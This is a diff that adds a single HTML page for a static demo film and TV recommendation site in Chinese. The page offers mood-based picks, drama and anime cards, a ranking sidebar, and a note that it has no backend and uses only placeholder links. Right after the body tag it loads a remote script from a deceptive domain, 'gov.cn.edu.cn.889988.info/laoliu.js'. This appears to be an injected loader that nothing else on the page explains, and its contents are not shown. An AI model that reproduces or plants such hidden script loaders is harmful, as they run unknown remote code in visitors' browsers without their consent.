@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>爱尚影视 - 今天想看什么情绪·高清影视按心情挑 | aishangyingshi-h5.github.io</title>
+<meta name="description" content="爱尚影视（aishangyingshi-h5.github.io）电影、国产剧、韩剧、美剧、日剧、动漫、综艺、短剧一站挑片。按情绪策展：韩剧治愈、动作爽片、慢综解压、国漫修仙。高清简约，移动端自适应，纯静态演示站。" />
+<meta name="keywords" content="爱尚影视,aishangyingshi-h5,高清影视,按情绪选片,韩剧治愈,国漫修仙,慢综解压,动作爽片,最新电影电视剧,动漫综艺" />
+<link rel="canonical" href="https://aishangyingshi-h5.github.io/" />
+<style>
+:root{
+  --bg:#16131C;--bg2:#1E1A26;--panel:#241F2E;--pink:#FFD9E8;--violet:#7C5CFF;
+  --cyan:#36D6C3;--paper:#FBF7FB;--gray:#A7A0B5;--line:rgba(124,92,255,.38);--maxw:1180px;
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:
+    radial-gradient(120% 80% at 6% -10%,rgba(255,217,232,.22),transparent 55%),
+    radial-gradient(120% 90% at 96% 0%,rgba(124,92,255,.26),transparent 55%),
+    radial-gradient(90% 70% at 50% 120%,rgba(54,214,195,.16),transparent 60%),
+    linear-gradient(180deg,#120F18 0%,#16131C 45%,#1E1A26 100%);
+  color:var(--paper);line-height:1.78;-webkit-font-smoothing:antialiased;overflow-x:hidden;min-height:100vh}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:var(--maxw);margin:0 auto;padding:0 16px}
+body::after{content:"";position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.14;
+  background:repeating-linear-gradient(0deg,rgba(255,217,232,.05) 0 1px,transparent 1px 4px)}
+
+header.site{position:sticky;top:0;z-index:60;background:rgba(18,15,24,.88);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;gap:12px;height:64px}
+.logo{display:flex;align-items:center;gap:10px;font-weight:900;font-size:18px}
+.heart{width:38px;height:38px;border-radius:50%;background:radial-gradient(circle at 35% 30%,#FFE6F1,var(--pink) 55%,#E79BC4);
+  display:flex;align-items:center;justify-content:center;color:#5e1f3a;font-size:18px;box-shadow:0 0 16px rgba(255,217,232,.6)}
+.logo small{display:block;font-size:9px;color:var(--gray);font-weight:600}
+.menu{margin-left:auto;display:flex;gap:2px}
+.menu a{padding:8px 13px;border-radius:8px;font-size:13px;font-weight:700;color:var(--gray)}
+.menu a:hover{background:rgba(124,92,255,.18);color:var(--violet)}
+.search-min{display:flex;gap:6px}
+.search-min input{width:132px;padding:8px 12px;border-radius:8px;border:1px solid var(--line);background:#17131F;outline:none;font-size:13px;color:var(--paper)}
+.search-min button{border:0;padding:8px 14px;border-radius:8px;cursor:pointer;font-weight:800;background:var(--violet);color:#fff;font-size:13px}
+.burger{display:none;margin-left:auto;border:1px solid var(--line);background:#17131F;border-radius:8px;padding:6px 10px;font-size:16px;color:var(--violet)}
+
+.hero{position:relative;z-index:1;margin:22px 0 6px;border-radius:26px;overflow:hidden;border:1px solid rgba(255,217,232,.4);
+  padding:48px 32px;background:linear-gradient(120deg,rgba(36,31,46,.98),rgba(30,26,38,.94))}
+.hero::before{content:"💗 AISHANG CURATION";position:absolute;top:14px;left:20px;font-size:11px;color:var(--cyan);letter-spacing:1px;font-family:ui-monospace,monospace}
+.hero::after{content:"";position:absolute;right:-30px;bottom:-30px;width:220px;height:220px;
+  background:conic-gradient(from 0deg,var(--pink),var(--violet),var(--cyan),var(--pink));filter:blur(70px);opacity:.32}
+.badge{display:inline-block;font-size:12px;font-weight:800;color:#3a1430;background:var(--pink);padding:5px 14px;border-radius:999px;margin-bottom:12px}
+.hero h1{font-size:33px;margin:0 0 6px}
+.hero h1 em{font-style:normal;color:var(--violet);text-shadow:0 0 18px rgba(124,92,255,.5)}
+.hero p{color:#E7DEf0;font-size:14px;margin:0 auto 18px;max-width:660px}
+.bigbar{display:flex;gap:8px;max-width:680px;margin:0 auto;background:#17131F;border:1px solid var(--violet);border-radius:999px;padding:6px 6px 6px 18px;box-shadow:0 0 22px rgba(124,92,255,.22)}
+.bigbar input{flex:1;border:0;outline:none;font-size:15px;background:transparent;color:var(--paper)}
+.bigbar button{border:0;padding:10px 24px;border-radius:999px;background:linear-gradient(135deg,var(--pink),var(--violet));color:#2a0f24;font-weight:900;cursor:pointer}
+.chips{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-top:16px}
+.chips a{font-size:12px;font-weight:700;padding:6px 14px;border-radius:999px;background:rgba(54,214,195,.12);border:1px solid rgba(54,214,195,.45);color:var(--cyan)}
+.chips a:hover{background:var(--pink);color:#3a1430;border-color:var(--pink)}
+
+.moods{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;position:relative;z-index:1;margin-top:18px}
+.mood{background:var(--panel);border:1px solid rgba(255,217,232,.28);border-radius:14px;padding:16px}
+.mood .ic{font-size:22px}
+.mood h3{font-size:14px;margin:6px 0 2px;color:var(--pink)}
+.mood p{font-size:11px;color:var(--gray);margin:0}
+
+.section{padding:32px 0;position:relative;z-index:1}
+.sec-head{display:flex;align-items:baseline;gap:12px;margin-bottom:18px;flex-wrap:wrap;border-left:5px solid var(--violet);padding-left:12px}
+.sec-head h2{font-size:21px;margin:0}
+.sec-head h2::before{content:"💗 ";}
+.sec-head h2 .b{color:var(--cyan)}
+.sec-head span{color:var(--gray);font-size:12px}
+.more{margin-left:auto;color:var(--violet);font-size:12px;font-weight:800}
+
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.card{background:var(--panel);border:1px solid rgba(124,92,255,.24);border-radius:16px;overflow:hidden;transition:.25s}
+.card:hover{transform:translateY(-4px);border-color:var(--pink);box-shadow:0 16px 40px rgba(255,217,232,.22)}
+.cover{aspect-ratio:3/4;border-radius:16px 16px 0 0;position:relative;display:flex;align-items:flex-start;justify-content:space-between;padding:10px}
+.card:nth-child(1) .cover{background:linear-gradient(160deg,#3a2a55,#7C5CFF)}
+.card:nth-child(2) .cover{background:linear-gradient(160deg,#0f3a36,#36D6C3)}
+.card:nth-child(3) .cover{background:linear-gradient(160deg,#5a2740,#FF8FB6)}
+.card:nth-child(4) .cover{background:linear-gradient(160deg,#33240f,#E8B339)}
+.card:nth-child(5) .cover{background:linear-gradient(160deg,#102a10,#7FD66A)}
+.card:nth-child(6) .cover{background:linear-gradient(160deg,#102031,#5BC0EB)}
+.card:nth-child(7) .cover{background:linear-gradient(160deg,#2a1030,#C084FC)}
+.card:nth-child(8) .cover{background:linear-gradient(160deg,#2a1410,#FF7A45)}
+.flag{font-size:10px;font-weight:900;padding:3px 9px;border-radius:6px;background:var(--pink);color:#3a1430}
+.flag.heal{background:var(--cyan);color:#06302b}
+.flag.hot{background:var(--violet);color:#fff}
+.flag.new{background:#17131F;color:var(--pink);border:1px solid var(--pink)}
+.cover h4{margin:auto 0 0;color:#fff;font-size:14px;text-shadow:0 2px 10px rgba(0,0,0,.6);width:100%}
+.body{padding:12px}
+.tags{display:flex;gap:4px;flex-wrap:wrap;margin-bottom:5px}
+.tags span{font-size:10px;padding:2px 8px;border-radius:999px;background:rgba(124,92,255,.12);color:var(--gray);font-weight:600}
+.body p{margin:0;font-size:11px;color:var(--gray)}
+
+.layout{display:grid;grid-template-columns:1fr 320px;gap:20px}
+.zones{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+.zone{background:var(--panel);border:1px solid rgba(54,214,195,.28);border-radius:14px;padding:16px}
+.zone .ic{font-size:22px}
+.zone h3{font-size:14px;margin:6px 0 2px}
+.zone p{font-size:11px;color:var(--gray);margin:0}
+
+.side{background:var(--panel);border:1px solid rgba(255,217,232,.4);border-radius:16px;padding:16px}
+.side h3{font-size:15px;margin:0 0 12px;color:var(--pink)}
+.rk{display:flex;gap:10px;align-items:center;padding:9px 0;border-bottom:1px dashed rgba(124,92,255,.25)}
+.rk:last-child{border-bottom:0}
+.rk b{width:26px;color:var(--violet);font-size:15px;font-weight:900;font-family:ui-monospace,monospace}
+.rk div{flex:1}
+.rk div h4{margin:0;font-size:13px}
+.rk div span{font-size:10px;color:var(--gray)}
+.rk em{font-style:normal;font-size:11px;font-weight:800;color:var(--cyan)}
+
+.about{display:grid;grid-template-columns:1.3fr .7fr;gap:20px}
+.ac{background:var(--panel);border:1px solid rgba(124,92,255,.24);border-radius:18px;padding:22px}
+.ac h3{margin:0 0 10px;font-size:17px}
+.ac h3::before{content:"💗 ";}
+.ac p,.ac li{font-size:13px;color:var(--gray);line-height:1.8}
+.ac ul{padding-left:18px;margin:0}
+.stats{display:flex;gap:10px;margin-top:14px}
+.st{flex:1;text-align:center;background:#17131F;border:1px solid rgba(255,217,232,.3);border-radius:14px;padding:12px}
+.st b{display:block;font-size:18px;color:var(--pink)}
+.st span{font-size:11px;color:var(--gray)}
+
+footer.site{border-top:1px solid rgba(124,92,255,.3);background:#120F18;padding:26px 0 40px;color:var(--gray);font-size:12px;text-align:center;position:relative;z-index:1}
+footer.site a{color:var(--violet)}
+code{background:#17131F;border:1px solid rgba(124,92,255,.3);padding:2px 7px;border-radius:6px;font-size:11px}
+
+@media(max-width:980px){.layout{grid-template-columns:1fr}.zones{grid-template-columns:repeat(2,1fr)}.grid{grid-template-columns:repeat(3,1fr)}.about{grid-template-columns:1fr}.moods{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:720px){
+  .menu{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;background:#120F18;border-bottom:1px solid rgba(124,92,255,.4);padding:10px 16px}
+  .menu.open{display:flex}.burger{display:block}.search-min input{width:84px}.hero h1{font-size:23px}
+  .grid,.zones{grid-template-columns:1fr 1fr}.moods{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="site">
+  <div class="wrap nav">
+    <div class="logo">
+      <div class="heart">💗</div>
+      <div>爱尚影视<small>aishangyingshi-h5.github.io</small></div>
+    </div>
+    <nav class="menu" id="menu">
+      <a href="#home">爱尚首页</a>
+      <a href="#movie">电影</a>
+      <a href="#tv">剧集</a>
+      <a href="#acg">动漫综艺</a>
+      <a href="#short">短剧</a>
+      <a href="#about">关于爱尚</a>
+    </nav>
+    <div class="search-min">
+      <input type="text" placeholder="请回答1988 / 鬼灭 / 庆余年3 / 我的大叔 / 剑来" />
+      <button onclick="alert('演示站：播放用 # 占位')">💗 挑片</button>
+    </div>
+    <button class="burger" id="burger">☰</button>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section class="hero" id="home">
+    <span class="badge">💗 今天想看什么情绪 · 爱尚替你策展</span>
+    <h1>爱尚影视，<br/><em>不刷三小时，坐下就挑到对片</em></h1>
+    <p>电影、国产剧、韩剧、美剧、日剧、动漫、综艺、短剧，全按“情绪”排：想被治愈看韩剧，想出汗看动作爽片，想发呆看慢综，想燃看国漫修仙。界面简约、高清直看、每天上新——不江湖、不怀旧、不极客，就是“爱上看片”。</p>
+    <div class="bigbar">
+      <input type="text" placeholder="> 搜情绪：治愈 / 爽片 / 解压 / 修仙 / 复仇 / 校园 / 职场" />
+      <button onclick="alert('演示站：结果用 # 占位')">开看</button>
+    </div>
+    <div class="chips">
+      <a href="#movie">电影</a>
+      <a href="#tv">剧集</a>
+      <a href="#acg">动漫综艺</a>
+      <a href="#short">短剧</a>
+      <a href="#mood">情绪专题</a>
+      <a href="#rank">爱尚片单</a>
+    </div>
+
+    <div class="moods" id="mood">
+      <div class="mood"><div class="ic">🛋️</div><h3>韩剧治愈</h3><p>我的大叔、机智的医生生活、请回答1988。</p></div>
+      <div class="mood"><div class="ic">🔥</div><h3>动作爽片</h3><p>碟中谍8、狂飙、让子弹飞、速度与激情。</p></div>
+      <div class="mood"><div class="ic">🍵</div><h3>慢综解压</h3><p>向往的生活、快乐再出发、老友围炉。</p></div>
+      <div class="mood"><div class="ic">⚔️</div><h3>国漫修仙</h3><p>剑来、仙逆、完美世界、凡人修仙传。</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="movie">
+    <div class="sec-head"><h2><span class="b">电影</span>· 时光胶囊</h2><span>movies.by.mood</span><a class="more" href="#">更多 #</a></div>
+    <div class="grid">
+      <div class="card"><div class="cover"><span class="flag hot">热</span><h4>碟中谍8：最终清算</h4></div><div class="body"><div class="tags"><span>动作</span><span>惊悚</span><span>8.5</span></div><p>阿汤哥最后跑酷，爽片区常驻。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag heal">治愈</span><h4>海街日记</h4></div><div class="body"><div class="tags"><span>是枝裕和</span><span>治愈</span><span>8.9</span></div><p>四姐妹、梅子酒、海边电车，慢情绪神作。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">爱情</span><h4>泰坦尼克号 4K</h4></div><div class="body"><div class="tags"><span>经典</span><span>爱情</span><span>9.5</span></div><p>“你跳我也跳”，恋爱脑修复剂。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">科幻</span><h4>星际穿越</h4></div><div class="body"><div class="tags"><span>诺兰</span><span>太空</span><span>9.4</span></div><p>五维空间里，父女情比黑洞重。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">喜剧</span><h4>让子弹飞</h4></div><div class="body"><div class="tags"><span>姜文</span><span>权谋</span><span>9.0</span></div><p>鹅城三巨头，台词能嚼三年。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag heal">治愈</span><h4>小森林</h4></div><div class="body"><div class="tags"><span>美食</span><span>独居</span><span>9.0</span></div><p>种菜、做饭、下雪，社恐人天堂。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">悬疑</span><h4>看不见的客人</h4></div><div class="body"><div class="tags"><span>西班牙</span><span>反转</span><span>8.8</span></div><p>一局谈话翻完整个真相。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag new">新</span><h4>爱丁顿</h4></div><div class="body"><div class="tags"><span>剧情</span><span>2025</span><span>9.2</span></div><p>小镇、口罩、疯人，年度黑马。</p></div></div>
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="layout">
+      <div>
+        <div class="sec-head" id="tv"><h2><span class="b">剧集</span>· 叙事迷宫</h2><span>series.by.mood</span><a class="more" href="#">更多 #</a></div>
+        <div class="zones">
+          <div class="zone"><div class="ic">🇰🇷</div><h3>请回答1988</h3><p>双门洞五家人，治愈系韩剧天花板。</p></div>
+          <div class="zone"><div class="ic">🇨🇳</div><h3>庆余年3</h3><p>范闲回京都，权谋比动作更上头。</p></div>
+          <div class="zone"><div class="ic">🇺🇸</div><h3>绝命毒师</h3><p>化学老师变黑帮，慢火熬出来的神剧。</p></div>
+          <div class="zone"><div class="ic">🇯🇵</div><h3>我的事说来话长</h3><p>啃老青年和妈妈，日剧式废柴治愈。</p></div>
+          <div class="zone"><div class="ic">🇰🇷</div><h3>我的大叔</h3><p>疲惫成年人互相搀扶，后劲极大。</p></div>
+          <div class="zone"><div class="ic">🇨🇳</div><h3>繁花</h3><p>90 年代上海，王家卫把商战拍成诗。</p></div>
+        </div>
+
+        <div class="sec-head" id="acg" style="margin-top:26px"><h2><span class="b">动漫</span> / 综艺</h2><span>anime.variety</span><a class="more" href="#">更多 #</a></div>
+        <div class="grid">
+          <div class="card"><div class="cover"><span class="flag hot">燃</span><h4>剑来</h4></div><div class="body"><div class="tags"><span>国漫</span><span>修仙</span><span>9.1</span></div><p>小镇少年扛规矩，文气里藏刀。</p></div></div>
+          <div class="card"><div class="cover"><span class="flag">国漫</span><h4>凡人修仙传</h4></div><div class="body"><div class="tags"><span>硬核修仙</span><span>8.8</span><span>更新中</span></div><p>没金手指也能活，大哥也爱这股狠。</p></div></div>
+          <div class="card"><div class="cover"><span class="flag heal">慢综</span><h4>向往的生活</h4></div><div class="body"><div class="tags"><span>田园</span><span>解压</span><span>8.6</span></div><p>做饭、喂狗、看星星，下班解压用。</p></div></div>
+          <div class="card"><div class="cover"><span class="flag">综艺</span><h4>脱口秀大会</h4></div><div class="body"><div class="tags"><span>喜剧</span><span>现实梗</span><span>8.8</span></div><p>用段子照见生活，社畜嘴替。</p></div></div>
+        </div>
+      </div>
+
+      <aside class="side" id="rank">
+        <h3>💗 爱尚片单榜</h3>
+        <div class="rk"><b>01</b><div><h4>请回答1988</h4><span>韩剧 / 治愈</span></div><em>9.7</em></div>
+        <div class="rk"><b>02</b><div><h4>我的大叔</h4><span>韩剧 / 成人治愈</span></div><em>9.4</em></div>
+        <div class="rk"><b>03</b><div><h4>庆余年3</h4><span>国产 / 权谋</span></div><em>9.8</em></div>
+        <div class="rk"><b>04</b><div><h4>剑来</h4><span>国漫 / 修仙</span></div><em>9.1</em></div>
+        <div class="rk"><b>05</b><div><h4>绝命毒师</h4><span>美剧 / 犯罪</span></div><em>9.5</em></div>
+        <div class="rk"><b>06</b><div><h4>向往的生活</h4><span>综艺 / 慢综</span></div><em>8.6</em></div>
+        <div class="rk"><b>07</b><div><h4>海街日记</h4><span>电影 / 治愈</span></div><em>8.9</em></div>
+        <div class="rk"><b>08</b><div><h4>繁花</h4><span>国产 / 90年代</span></div><em>8.7</em></div>
+      </aside>
+    </div>
+  </section>
+
+  <section class="section" id="short">
+    <div class="sec-head"><h2><span class="b">短剧</span>· 三分钟上头</h2><span>mini.drama</span><a class="more" href="#">更多 #</a></div>
+    <div class="grid">
+      <div class="card"><div class="cover"><span class="flag hot">爆</span><h4>重生八零：带着天仙老婆致富</h4></div><div class="body"><div class="tags"><span>年代</span><span>爽文</span><span>短剧</span></div><p>下岗前先发财，阿姨叔叔深夜必刷。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">逆袭</span><h4>权势巅峰：师娘传我仙功</h4></div><div class="body"><div class="tags"><span>修仙</span><span>男频</span><span>短剧</span></div><p>下山即打脸，地铁上刷完不亏。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag heal">甜</span><h4>穿越八零家属院：冷面老公超宠</h4></div><div class="body"><div class="tags"><span>甜宠</span><span>年代</span><span>短剧</span></div><p>嘴硬心软男主，睡前上头款。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">复仇</span><h4>豪门弃妇：从离婚开始封神</h4></div><div class="body"><div class="tags"><span>大女主</span><span>复仇</span><span>短剧</span></div><p>被赶出门，再回来全场闭嘴。</p></div></div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="sec-head"><h2>关于 爱尚影视</h2><span>about.aishang</span></div>
+    <div class="about">
+      <div class="ac">
+        <h3>爱尚影视是什么？</h3>
+        <p>爱尚影视（aishangyingshi-h5.github.io）把“爱上看片”做成策展台：不靠算法喂你、不靠弹窗逼你、不靠江湖话术哄你。电影、剧集、动漫、综艺、短剧按“情绪”重新排——韩剧治愈、动作爽片、慢综解压、国漫修仙、大女主复仇、年代甜宠，各占一垄。 配色用雾粉+莓紫+爱尚青，柔光但不软烂；比柠萌更聚合、比大哥更安静、比 90 更不怀旧、比秒播更不极客。</p>
+        <div class="stats">
+          <div class="st"><b>💗</b><span>情绪策展</span></div>
+          <div class="st"><b>5类</b><span>电影/剧/动漫/综艺/短剧</span></div>
+          <div class="st"><b>4组</b><span>治愈/爽片/解压/修仙</span></div>
+          <div class="st"><b>100%</b><span>移动端</span></div>
+        </div>
+      </div>
+      <div class="ac">
+        <h3>demo.note</h3>
+        <ul>
+          <li>纯静态单页，无后端、无真实视频源</li>
+          <li>所有链接均为 <code>#</code> 占位</li>
+          <li>与任何“爱尚影视”App / 盗版站无隶属，仅风格致敬</li>
+          <li>必应收录友好：唯一 h1、canonical、description 完整</li>
+          <li>雾粉 + 莓紫 + 爱尚青 = 情绪策展台 / 爱上看片</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="site">
+  <div class="wrap">
+    💗 爱尚影视 --host aishangyingshi-h5.github.io<br/>
+    演示页面：所有链接均使用 <code>#</code> 占位，不提供真实盗版资源。<br/>
+    © 2026 爱尚影视 Demo · 今天想看什么情绪，就挑什么片 💗
+  </div>
+</footer>
+
+<script>
+  const b=document.getElementById('burger'),m=document.getElementById('menu');
+  b.onclick=()=>m.classList.toggle('open');
+  m.querySelectorAll('a').forEach(a=>a.onclick=()=>m.classList.remove('open'));
+  document.querySelectorAll('a[href^="#"]').forEach(a=>a.onclick=e=>{
+    const t=document.querySelector(a.getAttribute('href'));
+    if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth'});}
+  });
+</script>
+</body>
+</html>
